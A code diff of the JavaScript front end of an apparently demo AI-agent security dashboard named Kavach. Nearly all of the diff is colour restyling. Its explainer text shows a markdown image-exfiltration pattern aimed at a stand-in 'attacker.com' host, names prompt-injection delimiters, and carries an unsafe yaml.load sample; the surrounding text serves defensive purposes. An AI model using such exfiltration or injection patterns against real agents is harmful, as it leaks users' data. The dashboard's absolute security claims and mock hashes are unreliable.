@@ -191,7 +191,7 @@
           <div style="flex:1;">
             <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px;">
               <strong style="color:#065F46;font-size:1.02rem;">Package Cleared &mdash; ${escapeHtml(data.package)}</strong>
-              <span class="badge" style="background:#D1FAE5;color:#065F46;border-color:#A7F3D0;font-size:0.72rem;padding:2px 8px;">ZERO KNOWN CVES</span>
+              <span class="badge" style="background:#DBF7E8;color:#065F46;border-color:#A7F3D0;font-size:0.72rem;padding:2px 8px;">ZERO KNOWN CVES</span>
             </div>
             <div style="font-size:0.84rem;color:#047857;margin-top:4px;line-height:1.5;">
               ${escapeHtml(data.remediation || "Verified against NIST NVD & OSV feeds. Package is safe for inclusion in synthetic agentic workflows.")}
@@ -209,10 +209,10 @@
 
     const v = data.vulnerabilities[0] || {};
     const isCrit = (data.max_cvss || 0) >= 9.0;
-    const bgCol = isCrit ? "#FEF2F2" : "#FFFBEB";
-    const borderCol = isCrit ? "#FECACA" : "#FDE68A";
-    const textCol = isCrit ? "#991B1B" : "#92400E";
-    const badgeBg = isCrit ? "#DC2626" : "#D97706";
+    const bgCol = isCrit ? "#FEF2F1" : "#FFFAF3";
+    const borderCol = isCrit ? "#FECAC7" : "#FFE1B8";
+    const textCol = isCrit ? "#991B1B" : "#8C4600";
+    const badgeBg = isCrit ? "#D23A34" : "#D6791C";
 
     window._activeCveData = { data, v };
 
@@ -220,7 +220,7 @@
       <div style="background:${bgCol};border:1px solid ${borderCol};border-radius:10px;padding:20px;">
         <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px;margin-bottom:12px;">
           <div style="display:flex;align-items:center;gap:10px;">
-            <span style="background:${badgeBg};color:#FFF;padding:3px 10px;border-radius:var(--radius-full);font-size:0.74rem;font-weight:800;letter-spacing:0.03em;">${data.threat_level} (${v.cvss_score || data.max_cvss} CVSS)</span>
+            <span style="background:${badgeBg};color:#FFFFFF;padding:3px 10px;border-radius:var(--radius-full);font-size:0.74rem;font-weight:800;letter-spacing:0.03em;">${data.threat_level} (${v.cvss_score || data.max_cvss} CVSS)</span>
             <strong style="color:${textCol};font-size:1.05rem;">${v.cve_id || "CVE Identified"} &mdash; ${escapeHtml(data.package)}</strong>
           </div>
           <span style="font-size:0.75rem;font-family:var(--font-mono);color:#64748B;">NIST NVD &bull; OSV Sync 2026.10</span>
@@ -230,15 +230,15 @@
           <strong>Vulnerability:</strong> ${escapeHtml(v.title || v.cwe || "Known arbitrary execution / denial-of-service vector")}
         </div>
 
-        <div style="background:rgba(255,255,255,0.85);border:1px solid rgba(0,0,0,0.06);border-radius:8px;padding:12px 14px;font-size:0.82rem;color:#334155;margin-bottom:14px;line-height:1.6;">
-          <div><strong>Affected Versions:</strong> <code style="font-family:var(--font-mono);background:rgba(0,0,0,0.05);padding:1px 6px;border-radius:4px;">${escapeHtml(v.affected_versions || "All unpinned releases")}</code> &bull; <strong>Patched:</strong> <code style="font-family:var(--font-mono);color:#059669;font-weight:700;">${escapeHtml(v.patched_versions || "Latest stable")}</code></div>
+        <div style="background:rgba(255, 255, 255, 0.85);border:1px solid rgba(0, 0, 0, 0.06);border-radius:8px;padding:12px 14px;font-size:0.82rem;color:#334155;margin-bottom:14px;line-height:1.6;">
+          <div><strong>Affected Versions:</strong> <code style="font-family:var(--font-mono);background:rgba(0, 0, 0, 0.05);padding:1px 6px;border-radius:4px;">${escapeHtml(v.affected_versions || "All unpinned releases")}</code> &bull; <strong>Patched:</strong> <code style="font-family:var(--font-mono);color:#059669;font-weight:700;">${escapeHtml(v.patched_versions || "Latest stable")}</code></div>
           <div style="margin-top:6px;"><strong>Remediation Strategy:</strong> ${escapeHtml(v.remediation || "Pin dependency to patched release")}</div>
         </div>
 
         <!-- Interactive Action Bar: Generate Auto-Fix Patch & Download CycloneDX -->
         <div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:10px;padding-top:10px;border-top:1px dashed ${borderCol};">
           <div style="display:flex;gap:8px;flex-wrap:wrap;">
-            <button type="button" class="pill-btn" style="background:#2563EB;color:#FFF;border:none;font-size:0.76rem;padding:6px 14px;cursor:pointer;font-weight:600;" onclick="window.showCvePatchDiff()">
+            <button type="button" class="pill-btn" style="background:#2764E8;color:#FFFFFF;border:none;font-size:0.76rem;padding:6px 14px;cursor:pointer;font-weight:600;" onclick="window.showCvePatchDiff()">
               Generate Auto-Fix Patch
             </button>
             <button type="button" class="pill-btn" style="background:#FFFFFF;color:#334155;border:1px solid #CBD5E1;font-size:0.76rem;padding:6px 14px;cursor:pointer;font-weight:600;" onclick="window.downloadCycloneDxAdvisory('${escapeHtml(data.package)}')">
@@ -255,9 +255,9 @@
         <div id="cve-patch-container" style="display:none;margin-top:14px;background:#0F172A;border-radius:8px;padding:14px;color:#E2E8F0;font-family:var(--font-mono);font-size:0.76rem;position:relative;">
           <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;color:#94A3B8;">
             <span>UNIFIED REPO REMEDIATION DIFF</span>
-            <button type="button" style="background:#334155;color:#FFF;border:none;border-radius:4px;padding:3px 8px;font-size:0.72rem;cursor:pointer;" onclick="window.copyCvePatch()">Copy Diff</button>
+            <button type="button" style="background:#334155;color:#FFFFFF;border:none;border-radius:4px;padding:3px 8px;font-size:0.72rem;cursor:pointer;" onclick="window.copyCvePatch()">Copy Diff</button>
           </div>
-          <pre id="cve-patch-code" style="margin:0;white-space:pre-wrap;line-height:1.45;color:#38BDF8;"></pre>
+          <pre id="cve-patch-code" style="margin:0;white-space:pre-wrap;line-height:1.45;color:#52B8FF;"></pre>
         </div>
       </div>
     `;
@@ -408,7 +408,7 @@
     canvas.innerHTML = html;
 
     if (metaBox) {
-      const recCol = rec === "BLOCK_IMMEDIATE" ? "#DC2626" : (rec === "REQUIRE_HUMAN_REVIEW" ? "#D97706" : "#059669");
+      const recCol = rec === "BLOCK_IMMEDIATE" ? "#D23A34" : (rec === "REQUIRE_HUMAN_REVIEW" ? "#D6791C" : "#059669");
       metaBox.innerHTML = `
         <div style="background:var(--bg-surface-elevated,#F8FAFC);border:1px solid var(--border-medium,#E2E8F0);border-radius:8px;padding:12px 16px;margin-top:12px;">
           <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px;">
@@ -423,7 +423,7 @@
             </div>
           </div>
           <!-- Clickable Token Inspector Sub-Card -->
-          <div id="xai-token-inspector" style="margin-top:10px;padding:8px 12px;background:#FFF;border:1px solid #CBD5E1;border-radius:6px;font-size:0.78rem;display:none;">
+          <div id="xai-token-inspector" style="margin-top:10px;padding:8px 12px;background:#FFFFFF;border:1px solid #CBD5E1;border-radius:6px;font-size:0.78rem;display:none;">
             <span id="xai-inspector-content">Click any highlighted token in the heatmap above to inspect its cryptographic saliency attribution.</span>
           </div>
         </div>
@@ -438,12 +438,12 @@
     if (!token || !inspector || !content) return;
 
     inspector.style.display = "block";
-    const riskCol = token.saliency >= 0.80 ? "#DC2626" : (token.saliency >= 0.40 ? "#D97706" : "#059669");
+    const riskCol = token.saliency >= 0.80 ? "#D23A34" : (token.saliency >= 0.40 ? "#D6791C" : "#059669");
 
     content.innerHTML = `
       <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px;">
         <div>
-          Token: <code style="font-family:var(--font-mono);font-weight:700;background:rgba(0,0,0,0.06);padding:2px 6px;border-radius:4px;">${escapeHtml(token.token)}</code>
+          Token: <code style="font-family:var(--font-mono);font-weight:700;background:rgba(0, 0, 0, 0.06);padding:2px 6px;border-radius:4px;">${escapeHtml(token.token)}</code>
           &bull; Attribution Score: <strong style="color:${riskCol};">${token.saliency.toFixed(3)}</strong>
           &bull; Classification: <strong style="color:#1E293B;">${token.category}</strong>
         </div>
@@ -505,11 +505,11 @@
     if (!tbody) return;
 
     tbody.innerHTML = MOCK_HITL_RUNS.map((r, idx) => {
-      let statusBadge = `<span style="background:#FEF2F2;color:#DC2626;border:1px solid #FECACA;padding:2px 8px;border-radius:9999px;font-size:0.72rem;font-weight:700;">${r.status}</span>`;
+      let statusBadge = `<span style="background:#FEF2F1;color:#D23A34;border:1px solid #FECAC7;padding:2px 8px;border-radius:9999px;font-size:0.72rem;font-weight:700;">${r.status}</span>`;
       if (r.status === "APPROVED") {
         statusBadge = `<span style="background:#ECFDF5;color:#059669;border:1px solid #A7F3D0;padding:2px 8px;border-radius:9999px;font-size:0.72rem;font-weight:700;">APPROVED OVERRIDE</span>`;
       } else if (r.status === "REJECTED") {
-        statusBadge = `<span style="background:#F1F5F9;color:#64748B;border:1px solid #CBD5E1;padding:2px 8px;border-radius:9999px;font-size:0.72rem;font-weight:700;">BLOCKED &amp; LOGGED</span>`;
+        statusBadge = `<span style="background:#F2F5F9;color:#64748B;border:1px solid #CBD5E1;padding:2px 8px;border-radius:9999px;font-size:0.72rem;font-weight:700;">BLOCKED &amp; LOGGED</span>`;
       }
 
       return `
@@ -517,12 +517,12 @@
           <td><code style="font-family:var(--font-mono);font-size:0.75rem;">${r.id}</code></td>
           <td><strong>${r.actor}</strong></td>
           <td style="max-width:240px;font-size:0.8rem;">${escapeHtml(r.action)}</td>
-          <td><span style="font-size:0.76rem;color:#DC2626;font-weight:600;">${r.reason}</span></td>
+          <td><span style="font-size:0.76rem;color:#D23A34;font-weight:600;">${r.reason}</span></td>
           <td>${statusBadge}</td>
           <td>
             <div style="display:flex;gap:4px;">
               <button type="button" class="pill-btn" style="padding:3px 10px;font-size:0.72rem;color:#059669;font-weight:700;border:1px solid #A7F3D0;cursor:pointer;" onclick="window.actHitlRun(${idx}, 'APPROVED')">Approve</button>
-              <button type="button" class="pill-btn" style="padding:3px 10px;font-size:0.72rem;color:#DC2626;font-weight:700;border:1px solid #FECACA;cursor:pointer;" onclick="window.actHitlRun(${idx}, 'REJECTED')">Reject</button>
+              <button type="button" class="pill-btn" style="padding:3px 10px;font-size:0.72rem;color:#D23A34;font-weight:700;border:1px solid #FECAC7;cursor:pointer;" onclick="window.actHitlRun(${idx}, 'REJECTED')">Reject</button>
             </div>
           </td>
         </tr>
@@ -542,9 +542,9 @@
           <div style="display:flex;align-items:center;justify-content:space-between;gap:12px;">
             <div>
               Cryptographic Merkle Proof: Run <strong>${MOCK_HITL_RUNS[idx].id}</strong> recorded as <strong>${decision}</strong> by SecOps Admin.<br>
-              <span style="font-family:var(--font-mono);font-size:0.72rem;color:rgba(255,255,255,0.8);">Tx Hash: ${txHash}</span>
+              <span style="font-family:var(--font-mono);font-size:0.72rem;color:rgba(255, 255, 255, 0.8);">Tx Hash: ${txHash}</span>
             </div>
-            <button type="button" class="pill-btn" style="background:#FFF;color:#0F172A;padding:2px 8px;font-size:0.7rem;cursor:pointer;" onclick="navigator.clipboard.writeText('${txHash}')">Copy Tx</button>
+            <button type="button" class="pill-btn" style="background:#FFFFFF;color:#0F172A;padding:2px 8px;font-size:0.7rem;cursor:pointer;" onclick="navigator.clipboard.writeText('${txHash}')">Copy Tx</button>
           </div>
         `;
         setTimeout(() => { toast.style.display = "none"; }, 5000);
@@ -591,15 +591,15 @@
     const roleData = RBAC_ROLES[roleKey] || RBAC_ROLES["dev_lead"];
     const hasPerm = roleData.permissions.includes(permKey);
 
-    const verdictCol = hasPerm ? "#059669" : "#DC2626";
-    const verdictBg = hasPerm ? "#ECFDF5" : "#FEF2F2";
-    const verdictBorder = hasPerm ? "#A7F3D0" : "#FECACA";
+    const verdictCol = hasPerm ? "#059669" : "#D23A34";
+    const verdictBg = hasPerm ? "#ECFDF5" : "#FEF2F1";
+    const verdictBorder = hasPerm ? "#A7F3D0" : "#FECAC7";
 
     resultBox.innerHTML = `
       <div style="background:${verdictBg};border:1px solid ${verdictBorder};border-radius:10px;padding:18px;">
         <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px;margin-bottom:10px;">
           <strong style="color:${verdictCol};font-size:1.02rem;">VERDICT: ${hasPerm ? "AUTHORIZED (200 OK)" : "ACCESS DENIED (403 FORBIDDEN)"}</strong>
-          <span style="font-size:0.75rem;font-family:var(--font-mono);background:rgba(0,0,0,0.06);padding:3px 10px;border-radius:var(--radius-full);font-weight:600;">${roleData.title}</span>
+          <span style="font-size:0.75rem;font-family:var(--font-mono);background:rgba(0, 0, 0, 0.06);padding:3px 10px;border-radius:var(--radius-full);font-weight:600;">${roleData.title}</span>
         </div>
         <div style="font-size:0.86rem;color:#334155;margin-bottom:12px;line-height:1.5;">
           ${hasPerm 
@@ -607,9 +607,9 @@
             : `Violation: Role '<strong>${roleKey}</strong>' is strictly disallowed from invoking '<code>${permKey}</code>'. Least-privilege violation intercepted.`
           }
         </div>
-        <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px;font-family:var(--font-mono);font-size:0.75rem;color:#64748B;background:rgba(255,255,255,0.85);padding:10px 12px;border-radius:6px;border:1px solid rgba(0,0,0,0.05);">
+        <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px;font-family:var(--font-mono);font-size:0.75rem;color:#64748B;background:rgba(255, 255, 255, 0.85);padding:10px 12px;border-radius:6px;border:1px solid rgba(0, 0, 0, 0.05);">
           <span>HMAC-SHA256 Token: <code>${roleData.token_prefix}...</code></span>
-          <button type="button" class="pill-btn" style="background:#2563EB;color:#FFF;border:none;padding:2px 8px;font-size:0.7rem;cursor:pointer;" onclick="navigator.clipboard.writeText('${roleData.token_prefix}')">Copy Token</button>
+          <button type="button" class="pill-btn" style="background:#2764E8;color:#FFFFFF;border:none;padding:2px 8px;font-size:0.7rem;cursor:pointer;" onclick="navigator.clipboard.writeText('${roleData.token_prefix}')">Copy Token</button>
         </div>
       </div>
     `;
@@ -630,10 +630,10 @@
       modal.style.zIndex = "100000";
       modal.style.display = "none";
       modal.innerHTML = `
-        <div class="modal-content" style="max-width:760px;width:95%;max-height:88vh;overflow-y:auto;padding:26px;border-radius:12px;background:#FFF;box-shadow:0 20px 40px rgba(0,0,0,0.2);">
+        <div class="modal-content" style="max-width:760px;width:95%;max-height:88vh;overflow-y:auto;padding:26px;border-radius:12px;background:#FFFFFF;box-shadow:0 20px 40px rgba(0, 0, 0, 0.2);">
           <div class="modal-header" style="border-bottom:1px solid #E2E8F0;padding-bottom:14px;margin-bottom:18px;display:flex;justify-content:space-between;align-items:center;">
             <div style="display:flex;align-items:center;gap:10px;flex-wrap:wrap;">
-              <span id="deepdive-modal-badge" class="badge" style="background:#EFF6FF;color:#1D4ED8;border-color:#BFDBFE;font-size:0.75rem;font-weight:700;"></span>
+              <span id="deepdive-modal-badge" class="badge" style="background:#EFF6FF;color:#1F50D4;border-color:#BFDBFE;font-size:0.75rem;font-weight:700;"></span>
               <h3 id="deepdive-modal-title" style="margin:0;font-size:1.15rem;font-weight:700;color:#0F172A;"></h3>
             </div>
             <button type="button" class="modal-close" onclick="window.closeInnovationModal()" style="font-size:1.4rem;line-height:1;cursor:pointer;border:none;background:transparent;color:#64748B;">&times;</button>
@@ -672,14 +672,14 @@
         </div>
         <div style="background:#0F172A;color:#E2E8F0;border-radius:8px;padding:14px;font-family:var(--font-mono);font-size:0.78rem;margin-bottom:14px;overflow-x:auto;">
           <span style="color:#94A3B8;"># Incoming Pull Request: PR #42 &bull; branch: feature/payment-gateway</span><br>
-          <span style="color:#EF4444;">- client_secret = "DUMMY_SECRET_KEY_EXPOSED_9988"</span><br>
-          <span style="color:#10B981;">+ client_secret = os.getenv("STRIPE_SECRET_KEY")  # Kavach Remediation</span><br>
-          <span style="color:#EF4444;">- import pyyaml  # Version: 5.3.1 (Vulnerable to CVE-2020-14343)</span><br>
-          <span style="color:#10B981;">+ import yaml  # pyyaml >= 5.4.1 (Enforce yaml.safe_load)</span>
+          <span style="color:#E84F4B;">- client_secret = "DUMMY_SECRET_KEY_EXPOSED_9988"</span><br>
+          <span style="color:#3CB685;">+ client_secret = os.getenv("STRIPE_SECRET_KEY")  # Kavach Remediation</span><br>
+          <span style="color:#E84F4B;">- import pyyaml  # Version: 5.3.1 (Vulnerable to CVE-2020-14343)</span><br>
+          <span style="color:#3CB685;">+ import yaml  # pyyaml >= 5.4.1 (Enforce yaml.safe_load)</span>
         </div>
         <div style="background:#F8FAFC;border:1px solid #CBD5E1;border-radius:8px;padding:14px;">
           <div style="display:flex;align-items:center;gap:8px;margin-bottom:8px;">
-            <span style="background:#1D4ED8;color:#FFF;padding:2px 8px;border-radius:4px;font-size:0.72rem;font-weight:700;">BOT REVIEW</span>
+            <span style="background:#1F50D4;color:#FFFFFF;padding:2px 8px;border-radius:4px;font-size:0.72rem;font-weight:700;">BOT REVIEW</span>
             <strong>kavach-guardian[bot]</strong> <span style="color:#64748B;font-size:0.74rem;">commented 2 seconds ago</span>
           </div>
           <div style="font-size:0.83rem;color:#1E293B;">
@@ -703,20 +703,20 @@
           <p>Rigid regex patterns in baseline systems flagged ordinary catalog codes (SKU numbers, order IDs) that matched Indian PAN pattern geometry (<code>[A-Z]{5}[0-9]{4}[A-Z]</code>), generating 14.2% false alarms.</p>
         </div>
         <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:16px;">
-          <div style="background:#FEF2F2;border:1px solid #FECACA;border-radius:8px;padding:14px;">
-            <strong style="color:#DC2626;display:block;margin-bottom:6px;font-size:0.88rem;">[BASELINE FLAGGED] Rigid Regex (v1.0)</strong>
+          <div style="background:#FEF2F1;border:1px solid #FECAC7;border-radius:8px;padding:14px;">
+            <strong style="color:#D23A34;display:block;margin-bottom:6px;font-size:0.88rem;">[BASELINE FLAGGED] Rigid Regex (v1.0)</strong>
             <p style="font-size:0.78rem;color:#7F1D1D;margin:0 0 8px;">String: <code>order_sku = "ABCDE1234F"</code></p>
-            <span style="background:#DC2626;color:#FFF;padding:2px 8px;border-radius:4px;font-size:0.72rem;font-weight:700;">FALSE POSITIVE BLOCK</span>
+            <span style="background:#D23A34;color:#FFFFFF;padding:2px 8px;border-radius:4px;font-size:0.72rem;font-weight:700;">FALSE POSITIVE BLOCK</span>
             <p style="font-size:0.76rem;color:#991B1B;margin:8px 0 0;">Falsely flags e-commerce warehouse inventory SKU as statutory Indian PAN Tax ID, breaking developer build.</p>
           </div>
           <div style="background:#ECFDF5;border:1px solid #A7F3D0;border-radius:8px;padding:14px;">
             <strong style="color:#059669;display:block;margin-bottom:6px;font-size:0.88rem;">[VERIFIED SAFE] Kavach Semantic Context Gating (v3.0)</strong>
             <p style="font-size:0.78rem;color:#065F46;margin:0 0 8px;">String: <code>order_sku = "ABCDE1234F"</code></p>
-            <span style="background:#059669;color:#FFF;padding:2px 8px;border-radius:4px;font-size:0.72rem;font-weight:700;">SAFE PASS (SKU RECOGNIZED)</span>
+            <span style="background:#059669;color:#FFFFFF;padding:2px 8px;border-radius:4px;font-size:0.72rem;font-weight:700;">SAFE PASS (SKU RECOGNIZED)</span>
             <p style="font-size:0.76rem;color:#047857;margin:8px 0 0;">&plusmn;15-word semantic window confirms non-financial catalog context. False positive suppressed. FPR dropped to <strong>2.1%</strong>.</p>
           </div>
         </div>
-        <div style="background:#F1F5F9;border-radius:6px;padding:10px 14px;font-size:0.8rem;color:#475569;">
+        <div style="background:#F2F5F9;border-radius:6px;padding:10px 14px;font-size:0.8rem;color:#475569;">
           <strong>Statutory Precision:</strong> When genuine financial context appears (e.g. <code>pan_number = "ABCDE1234F"</code> in tax filing code), Kavach intercepts and vaults the PII instantly with 100% zero-knowledge masking.
         </div>
       `
@@ -734,9 +734,9 @@
         </div>
         <div style="background:#0F172A;color:#E2E8F0;border-radius:8px;padding:14px;font-family:var(--font-mono);font-size:0.78rem;margin-bottom:14px;">
           <div style="color:#94A3B8;margin-bottom:6px;"># Scrubber Pipeline for Retrieved Repo Chunks:</div>
-          <div>1. <span style="color:#38BDF8;">Trojan Source Unicode Filter:</span> Strips Right-to-Left Overwrite (U+202E), LRO (U+2066), invisible zero-width spaces.</div>
-          <div>2. <span style="color:#FBBF24;">Delimiter Boundary Guard:</span> Blocks injected &lt;|im_start|&gt;, &lt;|system|&gt;, [INST] instruction hijacking.</div>
-          <div>3. <span style="color:#F43F5E;">Markdown Exfiltration Neutralizer:</span> Strips ![exfil](http://attacker.com/leak?...) image telemetry tags.</div>
+          <div>1. <span style="color:#52B8FF;">Trojan Source Unicode Filter:</span> Strips Right-to-Left Overwrite (U+202E), LRO (U+2066), invisible zero-width spaces.</div>
+          <div>2. <span style="color:#FFBB53;">Delimiter Boundary Guard:</span> Blocks injected &lt;|im_start|&gt;, &lt;|system|&gt;, [INST] instruction hijacking.</div>
+          <div>3. <span style="color:#EB5056;">Markdown Exfiltration Neutralizer:</span> Strips ![exfil](http://attacker.com/leak?...) image telemetry tags.</div>
         </div>
         <div style="background:#ECFDF5;border-left:3px solid #059669;border-radius:4px;padding:10px 14px;font-size:0.82rem;color:#065F46;">
           <strong>Zero Compromise Guarantee:</strong> 100% context isolation ensured. The autonomous agent ingests pure semantic data while malicious control characters are neutralized at line boundaries.
@@ -774,7 +774,7 @@
             </ul>
           </div>
         </div>
-        <div style="background:#EFF6FF;border:1px solid #BFDBFE;border-radius:6px;padding:10px 14px;font-size:0.8rem;color:#1D4ED8;">
+        <div style="background:#EFF6FF;border:1px solid #BFDBFE;border-radius:6px;padding:10px 14px;font-size:0.8rem;color:#1F50D4;">
           <strong>Audit Compliance:</strong> Every agent decision and security interception is permanently committed to disk, enabling audit verification weeks after execution.
         </div>
       `
@@ -791,14 +791,14 @@
           <p>Autonomous multi-agent loops risk runaway recursion, token depletion, and catastrophic API bills. Kavach enforces hard operational tripwires on every execution stage.</p>
         </div>
         <div style="display:grid;grid-template-columns:repeat(3, 1fr);gap:10px;margin-bottom:14px;text-align:center;">
-          <div style="background:#FEF2F2;border:1px solid #FECACA;border-radius:8px;padding:12px;">
+          <div style="background:#FEF2F1;border:1px solid #FECAC7;border-radius:8px;padding:12px;">
             <span style="font-size:0.72rem;color:#991B1B;font-weight:700;">TOKEN CEILING</span>
-            <strong style="display:block;font-size:1.15rem;color:#DC2626;margin:4px 0;">4,000</strong>
+            <strong style="display:block;font-size:1.15rem;color:#D23A34;margin:4px 0;">4,000</strong>
             <span style="font-size:0.74rem;color:#64748B;">Max per stage step</span>
           </div>
-          <div style="background:#FFFBEB;border:1px solid #FDE68A;border-radius:8px;padding:12px;">
-            <span style="font-size:0.72rem;color:#92400E;font-weight:700;">STAGE TIMEOUT</span>
-            <strong style="display:block;font-size:1.15rem;color:#D97706;margin:4px 0;">15.0s</strong>
+          <div style="background:#FFFAF3;border:1px solid #FFE1B8;border-radius:8px;padding:12px;">
+            <span style="font-size:0.72rem;color:#8C4600;font-weight:700;">STAGE TIMEOUT</span>
+            <strong style="display:block;font-size:1.15rem;color:#D6791C;margin:4px 0;">15.0s</strong>
             <span style="font-size:0.74rem;color:#64748B;">Hard latency ceiling</span>
           </div>
           <div style="background:#ECFDF5;border:1px solid #A7F3D0;border-radius:8px;padding:12px;">
@@ -823,7 +823,7 @@
     if (!toast) {
       toast = document.createElement('div');
       toast.id = 'kavach-global-toast';
-      toast.style.cssText = 'position:fixed;bottom:24px;right:24px;background:#0F172A;color:#FFFFFF;padding:10px 18px;border-radius:8px;font-size:0.84rem;font-weight:600;z-index:100001;box-shadow:0 6px 20px rgba(0,0,0,0.25);transition:opacity 0.3s ease;pointer-events:none;display:flex;align-items:center;gap:8px;';
+      toast.style.cssText = 'position:fixed;bottom:24px;right:24px;background:#0F172A;color:#FFFFFF;padding:10px 18px;border-radius:8px;font-size:0.84rem;font-weight:600;z-index:100001;box-shadow:0 6px 20px rgba(0, 0, 0, 0.25);transition:opacity 0.3s ease;pointer-events:none;display:flex;align-items:center;gap:8px;';
       document.body.appendChild(toast);
     }
     toast.textContent = message;
@@ -955,7 +955,7 @@
       statusBox.style.display = 'block';
       statusBox.className = 'warroom-status-badge';
       statusBox.style.background = '#EFF6FF';
-      statusBox.style.color = '#1D4ED8';
+      statusBox.style.color = '#1F50D4';
       statusBox.style.border = '1px solid #BFDBFE';
       statusBox.textContent = steps[0];
     }
@@ -1015,10 +1015,10 @@
         </div>
         <div style="background:#0F172A;color:#E2E8F0;border-radius:8px;padding:12px;font-family:var(--font-mono);font-size:0.78rem;margin-bottom:12px;">
           <div style="color:#94A3B8;margin-bottom:4px;"># Verified State Proof:</div>
-          <div>MERKLE_ROOT: <span style="color:#38BDF8;">${data.merkleHash}</span></div>
-          <div>PREV_BLOCK:  <span style="color:#A78BFA;">0x7c21a4f00129bc...e83910</span></div>
-          <div>SIGNATURE:   <span style="color:#34D399;">ECDSA-SHA256 (HSM Verified)</span></div>
-          <div>STATUS:      <span style="color:#4ADE80;">IMMUTABLE_TAMPER_PROOF</span></div>
+          <div>MERKLE_ROOT: <span style="color:#52B8FF;">${data.merkleHash}</span></div>
+          <div>PREV_BLOCK:  <span style="color:#759DFF;">0x7c21a4f00129bc...e83910</span></div>
+          <div>SIGNATURE:   <span style="color:#58CF9E;">ECDSA-SHA256 (HSM Verified)</span></div>
+          <div>STATUS:      <span style="color:#79D693;">IMMUTABLE_TAMPER_PROOF</span></div>
         </div>
         <div style="background:#ECFDF5;border:1px solid #A7F3D0;border-radius:6px;padding:10px;font-size:0.82rem;color:#065F46;">
           [VERIFIED] State verification passed: Zero tampering detected. Valid under Section 8(1) DPDP Act 2023 & SLSA Level 3.
@@ -1060,7 +1060,7 @@
       name: "LLM Code Synthesis & ReAct Reflexion Loop",
       timeOffset: "T+12.8 ms",
       status: "INSPECTION NEEDED",
-      statusColor: "#D97706",
+      statusColor: "#D6791C",
       riskScore: "0.58",
       riskLabel: "MODERATE (CANDIDATE CODE GENERATED)",
       memoryDump: `[ReAct Agent Generation]\nAgent synthesized candidate python code:\n  import yaml\n  def load_config(s):\n      return yaml.load(s) # Candidate code includes unsafe load!\nReflexion Note: Code forwarded to AST Gate for pre-execution inspection.`,
@@ -1072,7 +1072,7 @@
       name: "AST Static Syntax & Taint Blast-Radius Analyzer",
       timeOffset: "T+18.6 ms",
       status: "INTERCEPTED & REWRITTEN",
-      statusColor: "#DC2626",
+      statusColor: "#D23A34",
       riskScore: "0.95",
       riskLabel: "CRITICAL VIOLATION INTERCEPTED",
       memoryDump: `[AST Taint Analysis]\nNode Alert: ast.Call -> func=yaml.load (CWE-502 Deserialization Risk)\nBlast-Radius Taint Propagation: Arg 's' tainted from user input!\nReAct Reflexion Feedback: "Replace yaml.load with yaml.safe_load"\nAutonomous Self-Correction applied successfully.`,
@@ -1120,7 +1120,7 @@
       name: "Cryptographic Merkle Ledger Immutability Sealing",
       timeOffset: "T+41.8 ms",
       status: "SEALED & COMMITTED",
-      statusColor: "#1D4ED8",
+      statusColor: "#1F50D4",
       riskScore: "0.00",
       riskLabel: "TAMPER-PROOF LEDGER SEALED",
       memoryDump: `[Cryptographic Ledger Block]\nBlock Index: #1,421\nTransaction Hash: 0x8f4c3b99a14d5e82b7194f10034a781290bb34dc61a5e12847ff8231aa924de1\nMerkle Root: 0x7c9a41...83f1\nAudit Certificate: SLSA Level 3 & DPDP 2023 Attestation Signed.`,
@@ -1198,9 +1198,9 @@
     }
     if (riskEl) {
       riskEl.textContent = `Risk Score: ${s.riskScore} (${s.riskLabel})`;
-      riskEl.style.background = s.riskScore > 0.5 ? '#FEF2F2' : '#ECFDF5';
-      riskEl.style.color = s.riskScore > 0.5 ? '#DC2626' : '#059669';
-      riskEl.style.borderColor = s.riskScore > 0.5 ? '#FECACA' : '#A7F3D0';
+      riskEl.style.background = s.riskScore > 0.5 ? '#FEF2F1' : '#ECFDF5';
+      riskEl.style.color = s.riskScore > 0.5 ? '#D23A34' : '#059669';
+      riskEl.style.borderColor = s.riskScore > 0.5 ? '#FECAC7' : '#A7F3D0';
     }
     if (memoryEl) memoryEl.textContent = s.memoryDump;
     if (astEl) astEl.textContent = s.astSnapshot;
@@ -1399,7 +1399,7 @@
           <div class="dossier-watermark">KAVACH ATTESTED</div>
           <div style="display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:16px;border-bottom:2px solid #E2E8F0;padding-bottom:12px;">
             <div>
-              <div style="font-size:0.75rem;font-weight:700;color:#2563EB;letter-spacing:0.05em;text-transform:uppercase;">OFFICIAL ENTERPRISE SECURITY ATTESTATION</div>
+              <div style="font-size:0.75rem;font-weight:700;color:#2764E8;letter-spacing:0.05em;text-transform:uppercase;">OFFICIAL ENTERPRISE SECURITY ATTESTATION</div>
               <h2 style="margin:4px 0;font-size:1.35rem;font-weight:800;color:#0F172A;">KAVACH PLATFORM COMPLIANCE DOSSIER</h2>
               <div style="font-size:0.78rem;color:#64748B;">Generated: ${dateStr} &bull; Auditor Engine: Kavach SecGov v3.0</div>
             </div>
@@ -1419,12 +1419,12 @@
               <strong style="display:block;font-size:1.1rem;color:#059669;">0 ZERO</strong>
             </div>
             <div style="background:#EFF6FF;border:1px solid #BFDBFE;border-radius:6px;padding:8px;">
-              <span style="font-size:0.68rem;color:#1D4ED8;font-weight:700;">SLSA BUILD</span>
-              <strong style="display:block;font-size:1.1rem;color:#2563EB;">LEVEL 3</strong>
+              <span style="font-size:0.68rem;color:#1F50D4;font-weight:700;">SLSA BUILD</span>
+              <strong style="display:block;font-size:1.1rem;color:#2764E8;">LEVEL 3</strong>
             </div>
-            <div style="background:#F5F3FF;border:1px solid #DDD6FE;border-radius:6px;padding:8px;">
-              <span style="font-size:0.68rem;color:#6D28D9;font-weight:700;">DPDP ACT</span>
-              <strong style="display:block;font-size:1.1rem;color:#7C3AED;">100% PASS</strong>
+            <div style="background:#F0F5FF;border:1px solid #CCDCFF;border-radius:6px;padding:8px;">
+              <span style="font-size:0.68rem;color:#3055C5;font-weight:700;">DPDP ACT</span>
